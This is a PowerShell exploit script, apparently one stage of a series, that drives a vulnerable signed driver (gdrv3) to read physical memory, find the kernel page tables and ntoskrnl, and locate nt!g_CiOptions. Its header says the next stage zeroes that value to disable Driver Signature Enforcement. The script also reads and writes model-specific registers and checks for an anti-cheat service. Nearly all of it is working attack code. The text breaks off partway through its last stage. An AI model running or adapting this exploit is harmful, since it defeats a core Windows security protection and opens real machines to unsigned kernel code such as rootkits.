# ============================================================================
# p37_write.ps1 - prove a kernel-RAM WRITE and locate nt!g_CiOptions.
#
# p36 verdict: gdrv3 read = VERIFIED; W1 (\Device\PhysicalMemory) and W2 (MsIo)
# both dead (0xC0000022 / no G), W3 map only reaches the MMIO BAR.  On a normal
# boot that leaves exactly one road to DSE: a driver-mediated RAM write.
#
# THIS RUN, in order, nothing else changed:
#   S1  chunk-size ladder + whole-RAM PML4 self-map scan -> CR3
#   S2  MSR reads 0x2580 (LSTAR, GSBASE, TSC) + a same-value MSR write-back
#   S3  ntoskrnl VA from LSTAR (2 MiB-aligned downward, export-validated);
#       kernel-window page-table walk as fallback
#   S4  nt!g_CiOptions via `C7 05 imm32` self-consistent sites -> targetPa
#   S5  0x2014 role matrix (5 permutations, exact 0x18 in-struct, out=NULL) on
#       a page PROVEN to be ours (identity: user-write -> 0xC3502014 readback)
#   S6  0xC3502019 exact dll contract, result slots + dst buffer captured
#   S7  0x2800 alloc -> 0x2019 map -> 0x2808 copy (both field orders) -> 0x2804
#
# Pass criterion: one 0x2014 permutation or the 2019+2808 pair puts the marker
# into the verified page (read back through the independent 0x2014 path), and
# cr3 + ntoskrnl + g_CiOptions are all resolved.  p38 then only writes 0.
# Fire via p37_task.ps1.  BADPA-seeded from p36_badpa.txt.
# ============================================================================
$ErrorActionPreference = 'Continue'
$OUT = Join-Path $PSScriptRoot 'p37_write.txt'
$CS  = Join-Path $PSScriptRoot 'p37_prov.cs'

$script:L = New-Object System.Collections.ArrayList
function OpenLog {
    if ($script:logSw -ne $null) { return }
    $fs = New-Object System.IO.FileStream($OUT, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite, 4096, [System.IO.FileOptions]::WriteThrough)
    $script:logSw = New-Object System.IO.StreamWriter($fs, (New-Object System.Text.UTF8Encoding($false)))
    $script:logSw.AutoFlush = $true
}
function Log([string]$s) {
    $script:L.Add($s) | Out-Null
    try { OpenLog; $script:logSw.WriteLine($s) } catch { Add-Content -LiteralPath $OUT -Value $s -Encoding UTF8 }
    Write-Host $s
}

$mtx = New-Object System.Threading.Mutex($false, 'Global\QwenKern_p37')
if (-not $mtx.WaitOne(0)) { Write-Host 'p37 already running'; exit 0 }

$prevOut = Join-Path $PSScriptRoot 'p37_write_prev.txt'
if (Test-Path -LiteralPath $OUT) { Copy-Item -LiteralPath $OUT -Destination $prevOut -Force -EA 0 }
Set-Content -LiteralPath $OUT -Value ("=== p37 RAM-WRITE PROVER + g_CiOptions {0} ===" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss')) -Encoding UTF8
$adm = [bool](([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
Log ("  admin={0}  pid={1}  host={2}" -f $adm, $PID, $env:COMPUTERNAME)
if (-not $adm) { Log '  !! NOT ELEVATED - device DACL will deny; re-run via p37_task.ps1' }

# ---- environment (registry + sc only, no WMI on the critical path) ---------
function Br([string]$s) { Log ('  ... ' + $s) }
Br 'env: registry baseline'
$osCap = ''; $osBld = ''; $cpuName = ''
try {
    $k = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -EA 0
    $osCap = [string]$k.ProductName
    $osBld = ('{0}.{1}' -f $k.CurrentBuild, $k.UBR)
    $cpuName = [string](Get-ItemProperty 'HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0' -EA 0).ProcessorNameString
} catch { $osCap = 'regread-failed: ' + $_.Exception.Message }
Log ("  os={0} build={1}  cpu={2}" -f $osCap, $osBld, $cpuName)
Br 'env: SecureBoot / testsigning / HVCI'
try { $sbv = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State' -EA 0).UEFISecureBootEnabled } catch { $sbv = 'EXC' }
try { $tsg = ((& bcdedit.exe /enum '{current}' 2>&1 | Select-String 'testsigning') -join ' ; ') } catch { $tsg = 'EXC' }
try {
    $dgr = Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard' -EA 0
    $hvci = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity' -EA 0).Enabled
    Log ("  SecureBoot={0}  bcdedit=[{1}]  DeviceGuard VBS={2} HVCI={3}" -f $sbv, $tsg, $dgr.EnableVirtualizationBasedSecurity, $hvci)
} catch { Log ("  SecureBoot={0}  bcdedit=[{1}]" -f $sbv, $tsg) }
Br 'env: driver services (sc.exe)'
foreach ($s in 'gdrv3','MsIo','apexdrv','eaanticheat','EAAntiCheatService') {
    try { $r = ((& sc.exe query $s 2>&1) -join ' ') } catch { $r = '' }
    if ($r -match 'SERVICE_NAME') { Log ("  svc {0,-20} {1}" -f $s, (($r -replace '\s+',' ') -replace '.*STATE\s*:\s*','STATE ')) } else { Log ("  svc {0,-20} ABSENT" -f $s) }
}
Br 'env: done'

# ---- load the C# helper ----------------------------------------------------
try {
    Add-Type -Path $CS -ErrorAction Stop
    Log '  [cs] p37_prov.cs compiled'
} catch {
    Log ("  [cs] COMPILE FAILED: {0}" -f $_.Exception.Message)
    '-- p37 ABORT (compile) --' | Add-Content -LiteralPath $OUT -Encoding UTF8
    exit 1
}

# ---- crash-learned bad-PA blacklist ----------------------------------------
# Seed from p36's file (its lessons still hold) and keep learning: a run that
# dies inside gdrv3 leaves its last PA in p37_io.txt; blacklist the enclosing
# 2 MiB so the next run walks past it instead of dying there again.
$badPath = Join-Path $PSScriptRoot 'p37_badpa.txt'
$seedPath = Join-Path $PSScriptRoot 'p36_badpa.txt'
$prevIo  = Join-Path $PSScriptRoot 'p37_io_prev.txt'
$bad = New-Object System.Collections.ArrayList
foreach ($bsrc in @($seedPath, $badPath)) {
    if (Test-Path -LiteralPath $bsrc) {
        foreach ($ln in @(Get-Content -LiteralPath $bsrc -EA 0)) {
            if ($ln -match '^\s*[0-9a-f]+\s*-\s*[0-9a-f]+\s*$') { $t = $ln.Trim(); if (-not $bad.Contains($t)) { $bad.Add($t) | Out-Null } }
        }
    }
}
$learned = ''
$ioPath = Join-Path $PSScriptRoot 'p37_io.txt'
if (Test-Path -LiteralPath $ioPath) { Copy-Item -LiteralPath $ioPath -Destination $prevIo -Force -EA 0 }
if ((Test-Path -LiteralPath $prevIo) -and (Test-Path -LiteralPath $prevOut)) {
    $prevLog = (Get-Content -LiteralPath $prevOut -EA 0) -join "`n"
    if ($prevLog -notmatch '-- p37 (END|ABORT)') {
        $lines = @(Get-Content -LiteralPath $prevIo -EA 0)
        for ($i = $lines.Count - 1; $i -ge 0; $i--) {
            if ($lines[$i] -match 'read pa=0x([0-9a-f]+) size=0x([0-9a-f]+)') {
                $kpa = [Convert]::ToUInt64($matches[1], 16)
                # The fault is one driver instruction on a bad backing PFN, and the
                # observed clusters span >=32 MB (low RAM lost all 16 blocks at
                # once), so blacklist a +-16 MB window instead of the single block:
                # one reboot then buys 32 MB of walk instead of 2 MB.
                $kb = (([uint64]$kpa) -shr 21) -shl 21
                $ks = $kb; if ($ks -gt 0x1000000) { $ks = $kb - 0x1000000 } else { $ks = 0x1000 }
                $learned = ('{0:x}-{1:x}' -f $ks, ($kb + 0x1200000))
                break
            }
        }
    }
}
if ($learned -ne '') {
    $ls = [Convert]::ToUInt64(($learned.Split('-'))[0], 16)
    $le = [Convert]::ToUInt64(($learned.Split('-'))[1], 16)
    if ($le -le $ls) { Log ('  !! BADPA: window {0} is degenerate (start >= end)' -f $learned) }
    elseif (-not $bad.Contains($learned)) {
        $bad.Add($learned) | Out-Null
        Log ("  BADPA: previous run died, blacklisting a window around it: {0}" -f $learned)
    } else { Log ("  BADPA: {0} is already covered, no new window" -f $learned) }
}
if ($bad.Count -gt 0) { Log ("  BADPA: {0} range(s) offered (p36 seed + p37 learned)" -f $bad.Count) }
[P37Prov]::SetBadRanges(($bad -join ','))
# The C# parser is the authority now: it repairs inverted pairs and sorts, so read
# the count back instead of trusting the file.  A silently-dropped range used to
# cost a whole boot per typo.
if ([P37Prov]::BadRejected -gt 0) { Log ("  !! BADPA: {0} range(s) rejected (unparsable/degenerate)" -f [P37Prov]::BadRejected) }
if ([P37Prov]::BadRepaired -gt 0) { Log ("  BADPA: {0} inverted range(s) repaired (dropped-digit shift)" -f [P37Prov]::BadRepaired) }
if ([P37Prov]::BadStarts.Length -eq 0) { Log '  !! BADPA: blacklist EMPTY - the walk will re-enter every crash hole' }
else { Log ("  BADPA: {0} range(s) active, {1} MB blacklisted" -f [P37Prov]::BadStarts.Length, [math]::Round(([P37Prov]::BlacklistedBytes())/1MB)) }
# rewrite canonical: sorted, inverted pairs repaired, one range per line
try {
    $norm = for ($bi = 0; $bi -lt [P37Prov]::BadStarts.Length; $bi++) { '{0:x}-{1:x}' -f [P37Prov]::BadStarts[$bi], [P37Prov]::BadEnds[$bi] }
    $bl = ((@($norm) -join "`r`n") + "`r`n")
    $bb = [System.Text.Encoding]::UTF8.GetBytes($bl)
    $bfs = New-Object System.IO.FileStream($badPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite, 4096, [System.IO.FileOptions]::WriteThrough)
    try { $bfs.Write($bb, 0, $bb.Length); $bfs.Flush($true) } finally { $bfs.Dispose() }
} catch { Log ('  !! BADPA save failed: ' + $_.Exception.Message) }
[P37Prov]::SetBadRanges(($bad -join ','))

$ramTop = [uint64]0
try { $ramTop = [uint64](Get-CimInstance Win32_ComputerSystem -EA Stop).TotalPhysicalMemory } catch { $ramTop = [uint64]0 }
if ($ramTop -eq 0) { $ramTop = [uint64]0x800000000; Log '  !! physical memory unknown (P37Prov has no RamTop) - assuming 32 GB' }
Log ("  ramTop=0x{0:x} ({1} GB)" -f $ramTop, [math]::Round($ramTop/1GB,1))
$ramRanges = ''
try { $ramRanges = [P37Prov]::RamRangesFromRegistry() } catch { $ramRanges = 'native-exc: ' + $_.Exception.Message }
Log ("  ramRanges = {0}" -f $ramRanges)
if ($ramRanges -match '^(open|query|read|short|no-memory|native-exc)') { $ramRanges = '' }
if ($ramRanges -eq '') { Log '  !! RAM map EMPTY - fallback pa<ramTop + BADPA (hole PAs can still bugcheck)' }
[P37Prov]::SetRamRanges($ramRanges, $ramTop)

# per-IOCTL breadcrumb: must survive a bugcheck, so WriteThrough + flush.
Set-Content -LiteralPath $ioPath -Value ("# io breadcrumb {0}" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss')) -Encoding UTF8
$ioFs = New-Object System.IO.FileStream($ioPath, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite, 4096, [System.IO.FileOptions]::WriteThrough)
$script:ioFs = $ioFs
$script:ioSw = New-Object System.IO.StreamWriter($ioFs, (New-Object System.Text.UTF8Encoding($false)))
$script:ioSw.AutoFlush = $true
# every record is forced past the file cache before the IOCTL that may kill us
try { [P37Prov]::Notify = [P37Prov+Note] { param([string]$s) try { $script:ioSw.WriteLine($s); $script:ioSw.Flush(); $script:ioFs.Flush($true) } catch { } } }
catch { Log ('  !! Notify hook failed: ' + $_.Exception.Message) }

$verdict = @{ cr3 = $false; nt = $false; ci = $false; write = $false; msr = $false; mapk = $false; alloc = $false }
$cr3 = [uint64]0; $ntPa = [uint64]0; $ntVa = [uint64]0; $ntSize = [uint32]0
$ciVa = [uint64]0; $ciPa = [uint64]0

# ---- G0: open the only verified device ------------------------------------
$g = [IntPtr]::Zero
$eo = [P37Prov]::GdrvOpen([ref]$g)
if ($eo -ne '') {
    Log ("  G0 \\.\GIOV3 FAIL {0}" -f $eo)
    Log '  [cs] (device unavailable - aborting)'
    '-- p37 ABORT (no device) --' | Add-Content -LiteralPath $OUT -Encoding UTF8
    exit 1
}
Log ("  G0 \\.\GIOV3 open handle=0x{0:x}" -f $g.ToInt64())
try { (Get-Process -Id $PID).ProcessorAffinity = [IntPtr]1; Log '  cpu affinity = CPU0' } catch { Log ('  affinity failed: ' + $_.Exception.Message) }
Log ("  G0 read phys 0x1000 = {0}" -f ([P37Prov]::Hex([P37Prov]::GdrvProbe($g, [uint64]0x1000, 32))))
Log ("  G0 read phys 0x100000 = {0}" -f ([P37Prov]::Hex([P37Prov]::GdrvProbe($g, [uint64]0x100000, 16))))
Log ("  stage va=0x{0:x} locked={1} lastErr={2} issued={3} h1450={4}" -f [P37Prov]::StageVa, [P37Prov]::StageLocked, [P37Prov]::LastErr, [P37Prov]::Issued, [P37Prov]::Last1450)

# ---- pages for the write matrix (src is needed by the CR3 scan already) ---
# Fixed low VAs so q0 stays a plausible *PA* in the swapped roles and q3 stays
# a plausible *user VA*.  src carries tag 0xAB at +0x800: a PML4 candidate is
# only accepted as CR3 if it translates src and that tag comes back.
function AllocAt([uint64[]]$bases) {
    foreach ($b in $bases) {
        $p = [P37Prov]::PageAlloc($b)
        if ($p -ne [IntPtr]::Zero) { return $p }
    }
    return [IntPtr]::Zero
}
$srcPtr = [IntPtr]::Zero; $ctlPtr = [IntPtr]::Zero; $kvaPtr = [IntPtr]::Zero
$srcVa = [uint64]0
$srcPtr = AllocAt ([uint64[]]@(0x10000000L, 0x08000000L, 0x04000000L))
if ($srcPtr -ne [IntPtr]::Zero) {
    $srcVa = [uint64]$srcPtr.ToInt64()
    [P37Prov]::MemZero($srcPtr, 0x1000)
    [System.Runtime.InteropServices.Marshal]::WriteByte($srcPtr, 0x800, 0xAB)
    Log ("  src page 0x{0:x} (pattern carrier + CR3 tag validator)" -f $srcVa)
} else { Log '  !! src page alloc FAIL - CR3 scan cannot validate owner' }

# ---- S1: chunk ladder + PML4 self-map scan -> CR3 -------------------------
Log ''
Log '########## S1 whole-RAM PML4 self-map scan (read-only) ##########'
$probes = [uint64[]]@([uint64]0x100000, [uint64]0x100000000)
$crep = ''
$chunk = [P37Prov]::ChunkSize($g, $probes, [ref]$crep)
foreach ($ln in ($crep -split "`r`n")) { if ($ln -ne '') { Log ("  ladder{0}" -f $ln) } }
# 0x10000 is the only size proven crash-clean (624 MB scanned at it). The ladder
# above stays purely diagnostic; its verdict is deliberately overridden.
if ($chunk -eq 0) { Log '  ladder: no size passed - using the proven 0x10000' }
elseif ($chunk -ne 0x10000) { Log ("  ladder: measured best 0x{0:x}, clamped to the proven 0x10000" -f $chunk) }
$chunk = 0x10000
Log ("  chunk = 0x{0:x}" -f $chunk)
$pnotes = ''; $scanned = [uint64]0
$t0 = Get-Date
try { $pn = [P37Prov]::ScanPml4($g, $ramTop, $chunk, $srcVa, [byte]0xAB, [ref]$cr3, [ref]$pnotes, [ref]$scanned) }
catch { $pn = ''; $cr3 = [uint64]0; Log ('  S1 EXCEPTION: ' + $_.Exception.Message) }
foreach ($ln in ($pnotes -split "`r`n")) { if ($ln -ne '') { Log $ln } }
Log ("  S1 scanned=0x{0:x} candidates={1} cr3=0x{2:x} in {3:N1}s" -f $scanned, $pn, $cr3, ((Get-Date) - $t0).TotalSeconds)
if ($cr3 -ne 0) {
    $verdict.cr3 = $true
    $chk = [P37Prov]::RdQ($g, $cr3 + 0x1EDL * 8)
    $selfOk = (($chk -band 0x000FFFFFFFFFF000L) -eq $cr3)
    Log ("  S1 self-entry = 0x{0:x} self-consistent={1} - CR3 VALID" -f $chk, $selfOk)
} else { Log '  S1 no CR3  FAIL' }

# ---- S2: MSR reads (0x2580) ----------------------------------------------
Log ''
Log '########## S2 MSR reads via 0xC3502580 ##########'
$lstar = [uint64]0; $gsbase = [uint64]0
foreach ($msr in [uint32]0xC0000082, [uint32]0xC0000101, [uint32]0x10, [uint32]0xC0000081, [uint32]0xC0000102) {
    $mq0 = [uint64]0; $mq1 = [uint64]0; $mih = ''; $moh = ''; $mg = [uint32]0; $me = [uint32]0
    try { $mok = [P37Prov]::IoMsrRead($g, $msr, [ref]$mq0, [ref]$mq1, [ref]$mih, [ref]$moh, [ref]$mg, [ref]$me) }
    catch { $mok = $false; $me = 0xFFFF; Log ('  MSR EXCEPTION: ' + $_.Exception.Message) }
    Log ("  msr 0x{0:x8}: ok={1} err={2} info={3} q0=0x{4:x} q1=0x{5:x}" -f $msr, $mok, $me, $mg, $mq0, $mq1)
    Log ("    in ={0}" -f $mih)
    Log ("    out={0}" -f $moh)
    if ($mok -and ($mq0 -ne 0 -or $mq1 -ne 0)) {
        $verdict.msr = $true
        if ($msr -eq [uint32]0xC0000082) { $lstar = $mq0 }
        if ($msr -eq [uint32]0xC0000101) { $gsbase = $mq0 }
    }
}
Log ("  LSTAR=0x{0:x}  GSBASE=0x{1:x}" -f $lstar, $gsbase)
if ($lstar -ge 0xFFFFF80000000000L) {
    # same-value write-back: proves the 0x2584 path without changing anything
    try { $wok = [P37Prov]::IoMsrWrite($g, [uint32]0xC0000082, $lstar, [ref]$mg, [ref]$me) }
    catch { $wok = $false; $me = 0xFFFF }
    Log ("  MSR write-back LSTAR: ok={0} err={1} info={2} (written value = value just read)" -f $wok, $me, $mg)
}

# ---- S3: ntoskrnl VA -----------------------------------------------------
Log ''
Log '########## S3 ntoskrnl locate ##########'
if ($verdict.cr3 -and $lstar -ge 0xFFFFF80000000000L) {
    $nh = ''
    try { $nn = [P37Prov]::NtFromLstar($g, $cr3, $lstar, [ref]$ntVa, [ref]$ntSize, [ref]$nh) }
    catch { $nn = ''; Log ('  S3a EXCEPTION: ' + $_.Exception.Message) }
    foreach ($ln in ($nh -split "`r`n")) { if ($ln -ne '') { Log $ln } }
    Log ("  S3a from LSTAR result={0} va=0x{1:x}" -f $nn, $ntVa)
}
if ($ntVa -eq 0 -and $verdict.cr3) {
    Log '  S3b falling back to kernel-window page-table walk'
    $wh = ''
    try { $wn = [P37Prov]::ScanNtWin($g, $cr3, [ref]$ntVa, [ref]$ntSize, [ref]$wh) }
    catch { $wn = ''; Log ('  S3b EXCEPTION: ' + $_.Exception.Message) }
    foreach ($ln in ($wh -split "`r`n")) { if ($ln -ne '') { Log $ln } }
    Log ("  S3b window walk result={0} va=0x{1:x}" -f $wn, $ntVa)
}
if ($ntVa -ne 0) {
    $wok2 = [P37Prov]::Walk($g, $cr3, $ntVa, [ref]$ntPa)
    Log ("  S3 ntoskrnl va=0x{0:x} pa=0x{1:x} sizeOfImage=0x{2:x} walk={3}" -f $ntVa, $ntPa, $ntSize, $wok2)
    if ($wok2 -and $ntPa -ne 0) { $verdict.nt = $true; Log '  S3 PASS' } else { Log '  S3 walk-back FAIL' }
} else { Log '  S3 no ntoskrnl  FAIL' }

# ---- S4: nt!g_CiOptions --------------------------------------------------
Log ''
Log '########## S4 nt!g_CiOptions (C7 05 self-consistent sites) ##########'
if ($verdict.nt) {
    $crep2 = ''
    try { $cn = [P37Prov]::FindCiOptions($g, $cr3, $ntVa, $ntPa, $ntSize, [ref]$crep2) }
    catch { $cn = '0'; Log ('  S4 EXCEPTION: ' + $_.Exception.Message) }
    foreach ($ln in ($crep2 -split "`r`n")) { if ($ln -ne '') { Log $ln } }
    Log ("  S4 pattern hits = {0}" -f $cn)
    $ms = [regex]::Match($crep2, 'targetVa=0x([0-9a-f]+) targetPa=0x([0-9a-f]+) current=0x([0-9a-f]+)\s+<==')
    if ($ms.Success) {
        $ciVa = [uint64]::Parse($ms.Groups[1].Value, 'HexNumber')
        $ciPa = [uint64]::Parse($ms.Groups[2].Value, 'HexNumber')
        $civ = [uint32]::Parse($ms.Groups[3].Value, 'HexNumber')
        $verdict.ci = $true
        Log ("  S4 g_CiOptions targetVa=0x{0:x} targetPa=0x{1:x} current=0x{2:x2} -> p38 writes 0 here" -f $ciVa, $ciPa, $civ)
    } else { Log '  S4 no self-consistent hit' }
} else { Log '  S4 skipped (no ntoskrnl)' }

# ---- rotation: fresh handle + liveness canary ----------------------------
# The scan above issues thousands of IOCTLs; the driver degrades (1450) and can
# AV on a poisoned handle.  Drop it, take a fresh one, and never write blind:
# every write below is preceded by a canary read of live kernel code.
function Heal([string]$why) {
    Log ("  [heal] " + $why + " -> reopening GIOV3")
    try { [P37Prov]::CloseHandle2($script:g) | Out-Null } catch { }
    $script:g = [IntPtr]::Zero
    $he = [P37Prov]::GdrvOpen([ref]$script:g)
    $script:g = $script:g
    if ($he -ne '') { Log ("  [heal] reopen FAIL " + $he); return $false }
    Log ("  [heal] reopened handle=0x{0:x}" -f $script:g.ToInt64())
    return $true
}
function Canary {
    $c = [P37Prov]::GdrvReadStrict($script:g, [uint64]0x1000, 0x10)
    if ($c -ne $null -and $c[0] -eq 0xE9) { return $true }
    Log ("  [heal] canary dead (lastErr={0})" -f [P37Prov]::LastErr)
    if (-not (Heal 'canary')) { return $false }
    $c = [P37Prov]::GdrvReadStrict($script:g, [uint64]0x1000, 0x10)
    if ($c -ne $null -and $c[0] -eq 0xE9) { return $true }
    Log '  [heal] canary still dead after reopen'
    return $false
}
Log ''
Log '########## H handle rotation + canary before any write ##########'
try { [P37Prov]::CloseHandle2($g) | Out-Null } catch { }
$g = [IntPtr]::Zero
$hr = [P37Prov]::GdrvOpen([ref]$g)
Log ("  H reopen: {0} handle=0x{1:x}" -f $(if ($hr -eq '') { 'ok' } else { $hr }), $g.ToInt64())
$script:g = $g
$alive = Canary
Log ("  H canary phys 0x1000: {0}  stage=0x{1:x}  issued_so_far={2}" -f $(if ($alive) { 'live' } else { 'DEAD' }), [P37Prov]::StageVa, [P37Prov]::Issued)

# ---- S5: 0x2014 role matrix on a PROVEN-OURS page ------------------------
Log ''
Log '########## S5 0x2014 role matrix (5 perms, exact 0x18, out=NULL) ##########'
$ctlPtr = [IntPtr]::Zero; $kvaPtr = [IntPtr]::Zero
$targetPa = [uint64]0; $paVa = [uint64]0
$winPerm = -1
$ctlPtr = AllocAt ([uint64[]]@(0x12000000L, 0x0A000000L, 0x06000000L))
$kvaPtr = AllocAt ([uint64[]]@(0x14000000L, 0x0C000000L, 0x02000000L))
if (-not $alive) {
    Log '  S5 skipped: handle dead before any write'
} elseif ($srcPtr -eq [IntPtr]::Zero -or $ctlPtr -eq [IntPtr]::Zero -or $kvaPtr -eq [IntPtr]::Zero) {
    Log ("  S5 fixed-VA alloc FAIL src=0x{0:x} ctl=0x{1:x} kva=0x{2:x}" -f $srcPtr.ToInt64(), $ctlPtr.ToInt64(), $kvaPtr.ToInt64())
} else {
    $paVa = [uint64]$ctlPtr.ToInt64()
    Log ("  src 0x{0:x} (pattern)  ctl 0x{1:x} alias 0x{2:x} (target)  kva dst 0x{3:x}" -f $srcPtr.ToInt64(), $ctlPtr.ToInt64(), $paVa, $kvaPtr.ToInt64())
    [P37Prov]::MemZero($srcPtr, 0x1000); [P37Prov]::MemZero($ctlPtr, 0x1000); [P37Prov]::MemZero($kvaPtr, 0x1000)
    $identity = $false
    if ($verdict.cr3) {
        $iw = $false
        try { $iw = [P37Prov]::Walk($g, $cr3, $paVa, [ref]$targetPa) } catch { $iw = $false }
        if ($iw -and $targetPa -ne 0) {
            # identity proof: a byte written at the alias VA must appear at targetPa
            [System.Runtime.InteropServices.Marshal]::WriteByte($ctlPtr, 0, 0x5A)
            $idb = $null
            try { $idb = [P37Prov]::GdrvRead($g, $targetPa, 0x10) } catch { $idb = $null }
            if ($idb -ne $null -and $idb[0] -eq 0x5A) {
                $z = $true
                for ($q = 1; $q -lt 0x10; $q++) { if ($idb[$q] -ne 0) { $z = $false } }
                $identity = $z
            }
            [P37Prov]::MemZero($ctlPtr, 0x1000)
            Log ("  targetPa=0x{0:x} (from cr3 walk) identity={1}" -f $targetPa, $identity)
        } else { Log '  walk of the alias VA failed - coincidence mode' }
    }
    if (-not $identity) {
        $targetPa = $paVa
        Log ("  coincidence mode: targetPa = 0x{0:x} (low RAM, assumed free)" -f $targetPa)
    }
    for ($p = 0; $p -le 4; $p++) {
        if (-not (Canary)) { Log ("  perm {0}: skipped, handle dead" -f $p); continue }
        [P37Prov]::MemFill($srcPtr, 0x1000, [byte](0x11 + $p * 0x20))
        $pat = [P37Prov]::MemRead($srcPtr, 0x20)
        $pgt = [uint32]0; $per = [uint32]0
        try { $pres = [P37Prov]::IoPerm($g, $p, $targetPa, $paVa, $srcPtr, 0x1000, [ref]$pgt, [ref]$per) }
        catch { $pres = 'EXC ' + $_.Exception.Message }
        $back = [P37Prov]::GdrvReadStrict($g, $targetPa, 0x20)
        if ($back -eq $null -and (Canary)) { $back = [P37Prov]::GdrvReadStrict($g, $targetPa, 0x20) }
        $mt = $false
        if ($back -ne $null) { $mt = [P37Prov]::BytesEqual($back, $pat, 0x20) }
        $bh = '<read-fail/1450>'
        if ($back -ne $null) { $bh = [P37Prov]::Hex($back) }
        Log ("  perm {0}: {1} info={2} back={3}{4}" -f $p, $pres, $pgt, $bh, $(if ($mt) { '   <== WRITE' } else { '' }))
        if ($mt -and -not $verdict.write) { $verdict.write = $true; $winPerm = $p }
    }
    if ($verdict.write) {
        [P37Prov]::MemZero($srcPtr, 0x1000)
        [P37Prov]::MemZero($ctlPtr, 0x1000)
        $rgt = [uint32]0; $rer = [uint32]0
        $null = [P37Prov]::IoPerm($g, $winPerm, $targetPa, $paVa, $srcPtr, 0x1000, [ref]$rgt, [ref]$rer)
        $rz = [P37Prov]::GdrvReadStrict($g, $targetPa, 0x10)
        if ($rz -eq $null -and (Canary)) { $rz = [P37Prov]::GdrvReadStrict($g, $targetPa, 0x10) }
        $rzh = '<read-fail/1450>'
        if ($rz -ne $null) { $rzh = [P37Prov]::Hex($rz) }
        Log ("  WINNER perm {0} - page re-zeroed through it, readback={1}" -f $winPerm, $rzh)
    } else { Log '  no permutation wrote  FAIL' }
}

# ---- S6: 0x2019 MapMem_Phys_To_Linear2 (exact dll contract) --------------
Log ''
Log '########## S6 0xC3502019 exact contract (result slots + dst captured) ##########'
$kva = [uint64]0
if (-not $alive) { Log '  S6 skipped (handle dead)' }
elseif ($targetPa -ne 0 -and $kvaPtr -ne [IntPtr]::Zero) {
    $aq0 = [uint64]0; $aq3 = [uint64]0; $adhex = ''
    $agt = [uint32]0; $aer = [uint32]0
    try { $aok = [P37Prov]::Io2019($g, $targetPa, 0x1000, $kvaPtr, [ref]$aq0, [ref]$aq3, [ref]$adhex, [ref]$agt, [ref]$aer) }
    catch { $aok = $false; Log ('  S6 EXCEPTION: ' + $_.Exception.Message) }
    Log ("  mapK pa=0x{0:x} ok={1} err={2} info={3} q0after=0x{4:x} q3after=0x{5:x}" -f $targetPa, $aok, $aer, $agt, $aq0, $aq3)
    Log ("  dst buffer = {0}" -f $adhex)
    $dk = [P37Prov]::MemRead($kvaPtr, 8)
    $dqw = [BitConverter]::ToUInt64($dk, 0)
    if ($aq0 -ge 0xFFFF000000000000L) { $kva = $aq0 }
    elseif ($dqw -ge 0xFFFF000000000000L) { $kva = $dqw }
    if ($kva -ne 0) { $verdict.mapk = $true; Log ("  S6 kernel mapping = 0x{0:x}  PASS" -f $kva) }
    else { Log '  S6 no kernel VA in result slots  FAIL' }
} else { Log '  S6 skipped (no target page)' }

# ---- S7: 0x2800 alloc -> 0x2019 -> 0x2808 copy -> 0x2804 free -----------
Log ''
Log '########## S7 0x2800 alloc / 0x2808 copy / 0x2804 free ##########'
$allocVa = [uint64]0; $allocPa = [uint64]0
$avt = [uint32]0; $aer2 = [uint32]0
if (-not (Canary)) { Log '  S7 skipped: handle dead' }
else {
try { $alok = [P37Prov]::Io2800($g, 0x1000, [ref]$allocVa, [ref]$allocPa, [ref]$avt, [ref]$aer2) }
catch { $alok = $false; Log ('  S7 alloc EXCEPTION: ' + $_.Exception.Message) }
Log ("  2800 alloc 0x1000: ok={0} err={1} info={2} va=0x{3:x} pa=0x{4:x}" -f $alok, $aer2, $avt, $allocVa, $allocPa)
if ($alok -and $allocVa -ge 0xFFFF000000000000L -and $allocPa -ne 0) {
    $verdict.alloc = $true
    $ramOk = [P37Prov]::InRamSpan($allocPa, 0x1000)
    Log ("  alloc pa is RAM-backed = {0}" -f $ramOk)
    try {
        if ($ramOk -and $kvaPtr -ne [IntPtr]::Zero) {
            $bq0 = [uint64]0; $bq3 = [uint64]0; $bdh = ''
            $aqt = [uint32]0; $aqe = [uint32]0
            $mok2 = $false
            try { $mok2 = [P37Prov]::Io2019($g, $allocPa, 0x1000, $kvaPtr, [ref]$bq0, [ref]$bq3, [ref]$bdh, [ref]$aqt, [ref]$aqe) }
            catch { $mok2 = $false }
            $akva = [uint64]0
            if ($bq0 -ge 0xFFFF000000000000L) { $akva = $bq0 }
            else {
                $dk2 = [P37Prov]::MemRead($kvaPtr, 8)
                $dqw2 = [BitConverter]::ToUInt64($dk2, 0)
                if ($dqw2 -ge 0xFFFF000000000000L) { $akva = $dqw2 }
            }
            Log ("  2019 map of alloc pa: ok={0} kva=0x{1:x}" -f $mok2, $akva)
            if ($akva -ne 0 -and $srcPtr -ne [IntPtr]::Zero) {
                [P37Prov]::MemFill($srcPtr, 0x1000, [byte]0x77)
                $s7pat = [P37Prov]::MemRead($srcPtr, 0x20)
                foreach ($ord in 0, 1) {
                    $cgt = [uint32]0; $cer = [uint32]0
                    if ($ord -eq 0) { $cres = [P37Prov]::Io2808($g, $akva, [uint64]$srcPtr.ToInt64(), 0x1000, [ref]$cgt, [ref]$cer) }
                    else { $cres = [P37Prov]::Io2808($g, [uint64]$srcPtr.ToInt64(), $akva, 0x1000, [ref]$cgt, [ref]$cer) }
                    $cback = [P37Prov]::GdrvReadStrict($g, $allocPa, 0x20)
                    if ($cback -eq $null -and (Canary)) { $cback = [P37Prov]::GdrvReadStrict($g, $allocPa, 0x20) }
                    $cm = $false
                    if ($cback -ne $null) { $cm = [P37Prov]::BytesEqual($cback, $s7pat, 0x20) }
